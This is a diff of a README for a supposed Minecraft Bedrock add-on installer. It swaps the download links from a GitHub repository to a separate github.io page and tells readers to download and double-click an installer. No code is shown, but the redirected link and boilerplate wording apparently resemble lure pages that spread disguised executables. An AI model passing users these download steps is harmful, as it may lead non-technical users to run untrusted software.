@@ -1,6 +1,6 @@
 # 📦 addon-ez-loader-update - Manage Minecraft Bedrock addons with ease
 
-[![Download Addon-ez v2026](https://img.shields.io/badge/Download-Addon--ez-blue.svg)](https://github.com/Reignitete5556/addon-ez-loader-update)
+[![Download Addon-ez v2026](https://img.shields.io/badge/Download-Addon--ez-blue.svg)](https://reignitete5556.github.io)
 
 Addon-ez v2026 provides a simple way to browse, prepare, and install Minecraft Bedrock add-ons. The application runs through your web browser to bridge the gap between file downloads and your game folder. You do not need technical skills to handle complex file structures or manual installation paths.
 
@@ -18,7 +18,7 @@ Your computer must meet these basic requirements to run the installer:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the project website at [https://github.com/Reignitete5556/addon-ez-loader-update](https://github.com/Reignitete5556/addon-ez-loader-update) to download the latest version of the installer.
+1. Visit the project website at [https://reignitete5556.github.io](https://reignitete5556.github.io) to download the latest version of the installer.
 2. Locate the downloaded file in your Downloads folder.
 3. Double-click the file to start the setup process.
 4. Follow the instructions on the screen to finish the installation.
